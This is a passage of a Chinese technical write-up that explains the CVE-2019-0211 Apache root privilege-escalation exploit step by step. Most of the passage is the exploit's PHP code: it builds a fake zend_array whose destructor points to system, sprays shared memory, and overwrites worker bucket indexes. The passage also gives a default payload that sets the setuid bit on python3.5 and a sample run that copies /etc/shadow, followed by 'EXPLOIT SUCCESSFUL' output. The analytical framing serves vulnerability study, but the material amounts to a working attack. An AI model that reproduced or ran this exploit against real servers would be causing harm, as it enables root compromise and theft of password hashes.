                ht->pDestructor(val)
上面的代码properties是一个zend_array结构，同时properties又是前面mutex的地址，apr_proc_mutex_t和zend_array是叠加的，如下所示，我们控制其中的arData，pDestructor，如果我们将上面&ht->arData[0]->val放入要执行的命令，pDestructor()覆盖为system的地址，就可以实现命令执行了。
    struct _zend_array {
        zend_refcounted_h gc;
        //...
        uint32_t          nTableMask;
        Bucket           *arData;
        uint32_t          nNumUsed;
        uint32_t          nNumOfElements;
        uint32_t          nTableSize;
        uint32_t          nInternalPointer;
        zend_long         nNextFreeElement;
        dtor_func_t       pDestructor;
    };
回到exp中，首先构造bucket部分，放入要执行的命令，没有参数时默认执行”chmod +s
/usr/bin/python3.5″，但是自定义的命令长度也不能超过152字节。
    # Build payload
    $payload_start = $spray_min - $size_worker_score;
    $z = ptr2str(0);
      # Payload maxsize 264 - 112 = 152
          $bucket = isset($_REQUEST['cmd']) ?
            $_REQUEST['cmd'] :
            "chmod +s /usr/bin/python3.5";
          if(strlen($bucket) > $size_worker_score - 112)    {
          o(        'Payload size is bigger than available space (' .
            ($size_worker_score - 112) .
            '), exiting.'
          );
          exit();
        }
          # Align
          $bucket = str_pad($bucket, $size_worker_score - 112, "\x00");
然后是meth，将原本child_init的指针改为zend_object_std_dtor
    # apr_proc_mutex_unix_lock_methods_t
        $meth =         $z .        $z .        $z .        $z .        $z .        $z .
          # child_init        ptr2str($addresses['zend_object_std_dtor'])    ;
调试过程中也可以看到child_init被覆盖：
然后是properties（zend_array和apr_proc_mutex_t结构的叠加），u-nTableMask的位置将用作apr_proc_mutex_t结构的meth，而arData指向payload中的bucket。
          $properties =
           # refcount      ptr2str(1) .
          # u-nTableMask meth
          ptr2str($payload_start + strlen($bucket)) .
          # Bucket arData
          ptr2str($payload_start) .
          # uint32_t nNumUsed;
          ptr2str(1, 4) .
            # uint32_t nNumOfElements;
          ptr2str(0, 4) .
          # uint32_t nTableSize
          ptr2str(0, 4) .
          # uint32_t nInternalPointer
          ptr2str(0, 4) .
          # zend_long nNextFreeElement
          $z .
          # dtor_func_t pDestructor
          ptr2str($addresses['system'])
        ;
将三个部分组合：
        $payload =       $bucket .      $meth .      $properties;
通过前面UAF控制的字符串abc写入SHM未使用部分的开头
        o('Placing payload at address 0x' . dechex($payload_start));
        $p = $payload_start - $address;
        for(      $i = 0;      $i abc[$p+$i] = $payload[$i];
        }
打印信息，将SHM剩下的部分喷射为properties的地址
        $properties_address = $payload_start + strlen($bucket) + strlen($meth);
        o('Spraying pointer');
        o('  Address: 0x' . dechex($properties_address));
        o('  From: 0x' . dechex($spray_min));
        o('  To: 0x' . dechex($spray_max));
        o('  Size: 0x' . dechex($spray_size));
        o('  Covered: 0x' . dechex($spray_size * count($workers_pids)));
        o('  Apache: 0x' . dechex(      $addresses['apache'][1] -      $addresses['apache'][0]    ));
        $s_properties_address = ptr2str($properties_address);
        for(
          $i = $spray_min;
          $i abc[$i - $address] = $s_properties_address[$i % 8];
        }
讲到这里可以再回头看看文章刚开始的图，应该就更容易理解了。
### 2.6 进一步提高利用成功率
前面还讲到，可以修改每个worker的process_score->bucket结构，这样一来，利用成功率就可以再乘以Apache
Worker的数量，因为2.4中计算出的bucket索引能落在了SHM之外，如果有多个worker，如下图所示，就能提高&all_buckets[bucket]落在SHM中的概率：
迭代查找每个process_score结构直到找到每个PID，再将找到的PID$workers_pids中的PID对比，匹配的就说明是正确的结构。
    $spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);
    $total_nb_buckets = $spray_nb_buckets * count($workers_pids);
    $bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);
        for(
          $p = $addresses['shm'][0] + 0x20;
          $p  0;
          $p += 0x24    )    {      $l = $p - $address;
          $current_pid = str2ptr($this->abc, $l, 4);
          o('Got PID: ' . $current_pid);
          # The PID matches one of the workers
          if(in_array($current_pid, $workers_pids))
          {
            unset($workers_pids[$current_pid]);
            o('  PID matches');
将所有workerprocess_score.bucket都进行修改，而非修改其中一个：
            # Update bucket address
            $s_bucket_index = pack('l', $bucket_index);
            $this->abc[$l + 0x20] = $s_bucket_index[0];
            $this->abc[$l + 0x21] = $s_bucket_index[1];
            $this->abc[$l + 0x22] = $s_bucket_index[2];
            $this->abc[$l + 0x23] = $s_bucket_index[3];
            o('  Changed bucket value to ' . $bucket_index);
            $min = $spray_min - $size_prefork_child_bucket * $bucket_index;
            $max = $spray_max - $size_prefork_child_bucket * $bucket_index;
            o('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));
            # This bucket range is covered, go to the next one
            $bucket_index += $spray_nb_buckets;
到这里，整个漏洞利用过程就结束了，可以等到6:25AM查看利用是否利用成功，也可以手动执行apachectl graceful验证
        if(count($workers_pids) > 0)
        {
          o(        'Unable to find PIDs ' .        implode(', ', $workers_pids) .        ' in SHM, exiting.'      );
          exit();
        }
        o('');
        o('EXPLOIT SUCCESSFUL.');
        o('Await 6:25AM.');
            return 0;
    ➜ curl http://192.168.116.133/carpediem.php\?cmd\=cp+/etc/shadow+/tmp/CARPE (DIEM) ~ CVE-2019-0211
    PID: 887Fetching addresses zend_object_std_dtor: 0x7fc38f605700 system: 0x7fc3936bc480 libaprX: 0x7fc393c39000-0x0x7fc393c6b000 libaprR: 0x7fc393e6b000-0x0x7fc393e6c000 shm: 0x7fc394456000-0x0x7fc39446a000 apache: 0x7fc39446a000-0x0x7fc39452a000
    Obtaining apache workers PIDs Found apache worker: 887 Found apache worker: 888 Found apache worker: 889 Found apache worker: 890 Found apache worker: 891Got 5 PIDs.
    Triggering UAF Creating room and filling empty spaces
    Allocating $abc and $p
    Unsetting both variables and setting $protector Creating DateInterval objectUAF successful.
    Address of $abc: 0x7fc38aaa34e8
    Looking for all_buckets in memory [&mutex]: 0x7fc3944cab70 [mutex]: 0x7fc3944cacc0 [meth]: 0x7fc393e6bca0 [*]: 0x7fc393c53ce0 [*]: 0x7fc393c541b0 [*]: 0x7fc393c53e90 [*]: 0x7fc393c54210 [*]: 0x7fc393c53bf0 [*]: 0x7fc393c53960 [*]: 0x7fc393c6228call_buckets = 0x7fc3944cab60
    Computing potential bucket indexes and addresses[bucket_index_middle]: -17858Placing payload at address 0x7fc39445a148Spraying pointer Address: 0x7fc39445a218 From: 0x7fc39445a250 To: 0x7fc39446a000 Size: 0xfdb0 Covered: 0x4f470 Apache: 0xc0000
    Iterating in SHM to find PIDs...[spray_nb_bucket]: 2706[total_nb_buckets]: 13530[bucket_index]: -24623Got PID: 887 PID matches Changed bucket value to -24623 Ranges: 0x7fc3944ea6b8 - 0x7fc3944fa468Got PID: 888 PID matches Changed bucket value to -21917 Ranges: 0x7fc3944da908 - 0x7fc3944ea6b8Got PID: 889 PID matches Changed bucket value to -19211 Ranges: 0x7fc3944cab58 - 0x7fc3944da908Got PID: 890 PID matches Changed bucket value to -16505 Ranges: 0x7fc3944bada8 - 0x7fc3944cab58Got PID: 891 PID matches Changed bucket value to -13799 Ranges: 0x7fc3944aaff8 - 0x7fc3944bada8
    EXPLOIT SUCCESSFUL.Await 6:25AM.
## 0x03 参考资料
[1] CVE-2019-0211 Apache Root Privilege Escalation
(
[2] exploit
(
[3] PHP7内核剖析
(